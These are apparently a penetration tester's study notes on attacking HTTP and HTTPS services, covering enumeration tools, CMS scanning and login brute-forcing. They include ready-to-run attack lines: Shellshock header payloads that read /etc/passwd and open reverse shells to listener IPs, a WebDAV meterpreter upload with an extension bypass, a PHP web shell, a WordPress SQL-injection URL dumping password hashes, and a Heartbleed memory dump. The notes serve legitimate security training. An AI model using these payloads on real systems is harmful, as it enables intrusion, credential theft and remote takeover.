# HTTP[s]



**HTTP Status Codes**

https://www.restapitutorial.com/httpstatuscodes.html 

https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

==200 ok, 301 moved permanent, 302 found, 403 forbidden, 404 not found, 500 internal server error==

> Things to be on look for: Default credentials for software
> Look into source code or SVN where version info is stored (HTB Writeup)
>
> 

**Request**

<img src="http request.png" alt="http request" style="zoom:48%;" />

**Response**

<img src="http response.png" alt="http response" style="zoom:48%;" />

**In Burp in the repeater tab create your own request**

```
GET / HTTP/1.0
Host: www.yourtarget.com
2 empty lines
```

**Netcat**

```bash
nc 192.168.102.136 80
HEAD / HTTP/1.0
<enter><enter>
```



**Basics**
https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html - sec14.1

GET / HTTP/1.1
Encoding: Asci, Unicode, ISO
HTML encoding &lt;  URL encoding %20
client-side=cookies, server-side=sessions
https://www.w3schools.com/tags/ref_urlencode.asp

character set
character encoding [representation, in bytes, of the symbols in a character set
Unicode uses: UTF-8, 16 and 32

### Same Origin Policy
Prevents a script from setting properties of another document comming from a different origin
a document can access (through JavaScript) the properties of another document only if they have the same origin

### Cookies
Set-Cookie HTTP header field
can only be set for domain
path = path within domain eg /downloads. Will not send cookies for /blog or /members
HttpOnly flag = used to force to send cookie only through HTTP
prevents cookie being read via JavaScript, Flash etc. XSS protection
Secure flag = forces browser to send cookie only through HTTPS

### Sessions [ store information on the server site]
session token or session id
PHPSESSID=13Kn5Z6U04pH

## HTTP METHODS
https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/
find out: get, head, post,delete etc etc
nc 10.11.1.8 80 -> OPTIONS / HTTP/1.1 -> Host: bob.thinc.local -> enter enter

## Subdomains
https://censys.io/certificates?q=.gamma.nl&page=2
https://github.com/ehsahil/recon-my-way/tree/master/aquatone
`gobuster -m dns -u gamma.nl -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 20`
Gobuster also has a -m dns mode for finding subdomains

**Wfuzz**
`wfuzz -w wordlist -u gamma.nl - H "host:FUZZ.gamma.nl" --hc 403`
`wfuzz -H 'Host: FUZZ.redcross.htb' -u https://10.10.10.113 -w /usr/share/seclists/Discovery/DNS/subs-subdomain.txt --hw 28`
site:.microsoft.com -site:www.microsoft.com



**Netcraft subdomain finder**
https://searchdns.netcraft.com



**SubFinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources**
`./subfinder -d freelancer.com -o output.txt`
`./subfinder -d example.com -b -w /opt/SecLists.... -t 20`

`nmap -p 80 --script dns-brute.nse domain.com`
`python dnscan.py -d domain.com -w ./subdomains-10000.txt`



## Virtual host 

[multiple website share the same server/IP address]



## Directories 

**[add words found on site to list]**

cewl and then append to list for gobuster ?
`dirb http://192.168.1.11 /usr/share/wordlists/dirb/small.txt -x /usr/share/wordlists/dirb/extensions_common.txt -vv`
`dirb http://10.10.10.78 /usr/share/wordlists/dirb/small.txt -X .sh, .php -o dirboutput.txt`
`gobuster -w /usr/share/wordlists/dirb/common.txt -x php,pl,sh,txt -u http://10.10.10.27 -s 200,204,301,302,307,403 -t 25 -e`

See reconscan dirb lists used !!

``` bash
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
gobuster dir -u 10.10.10.16 -x php -w /usr/share/wordlists/dirb/common.txt -t 20

dirsearch.py -u 10.10.10.68 -e php -w /usr/share/wordlists/dirb/common.txt -t 20 -r --suppress-empty
dirsearch.py -u 192.168.100.121 -e php,html -w /usr/share/wordlists/dirb/common.txt -t 25 -r -f --suppress-empty --exclude-subdir=.hta,index.php,icons,index
```



## File extensions
bak, bac, old, 000, ~, 01, _bak, 001, inc, Xxx, php, cgi, txt, asp
/usr/share/wordlists/dirb/mutations_common.txt
/usr/share/seclists/Discovery/Web-Content/

**gobuster -x**
**dirbuster with file extensions**



## Proxy like squid [3128]

https://security.stackexchange.com/questions/120708/nmap-through-proxy
to go to only local accessible ports like 3306

proxychains4.conf [socks4/5 or http] -> proxychains nmap -sT 192.168.56.3 -p 80
Sometimes use 127.0.0.1 as destination host
`nmap --proxy http://192.168.100.163 -n -Pn -sV 127.0.0.1`

Perform a nikto scan against target
`nikto -host http://10.11.1.44:8000`
Through a Proxy like Squid
`nikto -h 192.168.100.163 --useproxy http://192.168.100.163:3128`



## Enumeration

- `perl /opt/nikto/program/nikto.pl -host http://10.11.1.44:8000`
- `whatweb -v http://{ip} --color=never --no-errors``

- OWASP Zaproxy

- `nmap --script http-enum`

- Zap proxy active scan
- `skipfish -Y -L -W- -m [10] -o output.txt http://192.168.100.139``



--script="http-waf-detect,http-vhosts,http-robtex*,http-methods,http-enum"
python nettacker.py -i 192.168.100.121 -m all
nmap {nmap_extra} -sV -p {port} --script="(http* or ssl*) and not (broadcast or dos or external or http-slowloris* or fuzzer or brute)"

nmap','-n','-sV','-Pn','-vv','-p',port,'--script','banner,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-auth,http-backup-finder,http-bigip-cookie,http-cakephp-version,http-cisco-anyconnect,http-comments-displayer,http-config-backup,http-cookie-flags,http-cors,http-cross-domain-policy,http-default-accounts,http-drupal-enum,http-favicon,http-generator,http-git,http-grep,http-headers,http-jsonp-detection,http-ls,http-mcmp,http-method-tamper,http-methods,http-mobileversion-checker,http-ntlm-info,http-passwd,http-php-version,http-robots.txt,http-title,http-traceroute,http-unsafe-output-escaping,http-useragent-tester,http-userdir-enum,http-vhosts,http-vlcstreamer-ls,http-waf-detect,http-waf-fingerprint,http-webdav-scan','--script-args', "http.useragent=%s,http-waf-detect.aggro,http-waf-detect.detectBodyChanges,http-waf-fingerprint.intensive=1" % userAgent,'-oA','/root/scripts/recon_enum/results/exam/http/%s_%s_http' % (ip_address, port),ip_address])

curl -i 10.11.1.71

curl -sSik {scheme}://{address}:{port}/robots.txt -m 10
curl -sSik {scheme}://{address}:{port}/ -m 10 | grep Powered by
whatweb --color=never --no-errors -a 3 -v {scheme}://{address}:{port}



# [+] WebDAV

https://medium.com/@d0nut/week-8-exploitation-36c761572c83

wampp:xampp default credentials
http-iis-webdav-vuln.nse script
[manual] cadaver 192.168.100.138
/usr/bin/davtest -url <url> [options]
test what file extensions are allowed to be uploaded
[manual] davtest -url http://foobar:80

### Hashcat MD5 Apache webdav file  
hashcat -m 1600 -a 0 hash.txt rockyou.txt

**Upload shell to Vulnerable WebDAV directory, To attempt to bypass file type restriction upload:**
To see what options are allowed you can use use auxiliary/scanner/http/options If PUT method is allowed you probably can upload web .asp shell. In my case .asp file upload was forbidden and only .txt and .html were allowed. In such situation we should upload file.txt and then to copy it as file.asp;.txt

`msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.20 LPORT=4444 R | msfencode -t asp -o shell.asp`
cadaver http://192.168.0.60/
put shell.asp shell.txt
copy shell.txt shell.asp;.txt
Start reverse handler - browse to http://192.168.0.60/shell.asp;.txt



## Other

Robots.txt
Visit all URLs from robots.txt.
curl -s http://192.168.56.102/robots.txt | grep Disallow | sed 's/Disallow: //'
curl -i ${IP}/robots.txt

**Ippsec**
10.10.10.10/~root
index.html or index.php or default.aspx

.htaccess

**Make browser appear as a search engine**
curl -A "'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')" 10.11.1.39/robots.txt



## Targeting cgi-directories
`gobuster dir -u http://10.11.1.71/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -e -l`



## Shellshock port 80

**CVE-2014-6271**
https://cdn.members.elearnsecurity.com/ptp_v5/section_4/module_3/html/index.html
env x=‘() { :;}; echo vulnerable’ bash -c “echo this is a test”
./dirsearch.py -u http://192.168.13.29/ -e cgi -r

nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi 192.168.13.29 -p 80
nmap 10.11.1.71 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
ssh -i noob noob@$ip '() { :;}; /bin/bash'

wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi
wget -U "() { foo;};echo; /bin/nc 192.168.13.18 1234 -e /bin/sh" http://192.168.13.29/cgi-bin/login.cgi
wget -U "() { foo;};echo; /bin/nc 192.168.13.18 1234 -e /bin/sh" http://192.168.13.29/cgi-bin/login.cgi

wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status

curl -v --proxy 192.168.56.106:3128 http://192.168.56.106/cgi-bin/status -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id; exit"
curl -v --proxy 192.168.56.106:3128 http://192.168.56.106/cgi-bin/status -H "Referer: () { test;}; echo 'Content-Type: text/plain'; echo; echo; /bin/bash -i >& /dev/tcp/192.168.56.102/4445 0>&1"

**Reverse shell**
`curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/10.11.0.192/443 0>&1; echo zzzz;'"   http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'`



## HTTP bruteforce (forms)

`hydra -l admin -P /root/ctf_wordlist.txt domain.com http-post-form "/admin.php:u=^USER^&p=^PASS^&f=login:'Enter your username and password to continue'" -V`



# HTTPS - 443

Heartbleed / CRIME / Other similar attacks
Read the actual SSL CERT to:
find out potential correct vhost to GET
is the clock skewed
any names that could be usernames for bruteforce/guessing.

Module used to dump encrypted memory contents from an ssl host.
`msf > auxiliary/scanner/ssl/openssl_heartbleed`

## Heartbleed port-443
**OpenSSL versions 1.0.1 through 1.0.1f**
`nmap --script ssl-heartbleed 192.168.13.58 -p 443 -sV`
`msf > use auxiliary/scanner/ssl/openssl_heartbleed`
`msf auxiliary(scanner/ssl/openssl_heartbleed) -> show actions`
`set action DUMP`
`strings <downloaded file>`

**SSL certificate testing**
https://www.ssllabs.com/ssltest/analyze.html
`sslscan --show-certificate --no-colour {address}:{port}`
`sslyze --regular --certinfo=full %s:%s > %s/%s_%s_sslyze" % (ip_address, port, BASE, ip_address, port)`

**TLS & SSL Testing**
 `./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html`

# Content Management System

 **Wordpress, Joomla, Drupal**

### Drupal
`droopescan scan drupal -u http://IP_ADDR:PORT`
`cmsmap -f D http://10.11.1.49`

### Drupal bruteforce attack
#crack the password of admin
site="192.168.230.147"
id=$(curl -s http://$site/user/|grep "form_build_id" |cut -d"\"" -f6)

### Joomla
`index.php?option=%component_name%&task=%task_value%`

## WordPress
https://www.hackingarticles.in/wordpress-penetration-testing-using-wpscan-metasploit/
https://github.com/wetw0rk/malicious-wordpress-plugin

**Shell**
- plugin
- adapt 404 page with msfvenom shell or php-reverse-shell
- put <?php system($_GET['cmd']); ?> in main template

**t=themes, p=plugins, u=users**
wpscan --url http://IP_ADDR --enumerate u,p,t --force --wp-content-dir wp-content
wpscan --url http://192.168.56.101/wordpress --passwords /usr/share/wordlists/fasttrack.txt --usernames username -t 25

-Use custom content directory ...
wpscan -u www.example.com --wp-content-dir custom-content

**WordPress Scan - WordPress security scanner**
`wpscan --url $ip/blog --proxy $ip:3129`

**Passwords**
/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23

hydra -L fsocietyuniq -p test 192.168.90.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
hydra -l admin -P /usr/share/wordlists/rockyou.txt  10.11.1.251 http-post-form '/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Incorrect password'
hydra -l root@localhost -P /usr/share/wordlists/dirb/big.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed"

wpscan --url 10.11.1.251/wp --wordlist /root/Documents/oscp/files/rockyou.txt --username sean threads 50

### Brute force Wordpress (PHPASS)
cudahashcat64.exe -m 400 -a 3 hashfile wordlist

## Apache Tomcat
https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote
https://pentestlab.blog/2012/08/26/using-metasploit-to-create-a-war-backdoor/

**Apache Tomcat - Manager port 8180**
default credentials
`msf > use auxiliary/scanner/http/tomcat_mgr_login`
**Then deploy a reverse shell**
JSP shell - /usr/share/laudanum/

/usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
hydra -C default_accounts.txt ftp://localhost

**[8009,Apache Jserve]**

```bash
nmap','-n','-sV','-Pn','-vv','-p',port,'--script','banner,ajp-auth,ajp-headers,ajp-methods,ajp-request,vulners','--script-args', "http.useragent=%s" % userAgent,'-oA','/root/scripts/recon_enum/results/exam/http/%s_%s_jserve' % (ip_address, port),ip_address]
```



## Java RMI Registry port 1099
`nmap -sT 192.168.13.29 -p 1099 -sV`
`msf ->  /exploit/multi/misc/java_rmi_server`
`nmap -sV -p {port} --script="rmi-vuln-classloader,rmi-dumpregistry" {ip}`

## Java Deserialization

 **(Jboss, WebLogic, WebSphere, Jenkins)**

https://www.owasp.org/index.php/Deserialization_of_untrusted_data
https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
serialization itself is a process which allows for applications to convert data into a binary format, which is suitable for saving to disk. Deserialization is other way around
/usr/share/laudanum/ for shells

`nmap -p 1100 --script=rmi-vuln-classloader 10.11.1.73`